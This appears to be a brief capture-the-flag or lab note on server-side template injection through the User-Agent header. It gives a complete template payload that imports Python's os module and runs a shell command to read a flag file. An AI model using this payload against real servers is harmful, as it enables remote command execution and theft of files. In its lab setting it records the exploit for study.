* SSTI in user-agent header
* User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag/flag.txt').read()}}

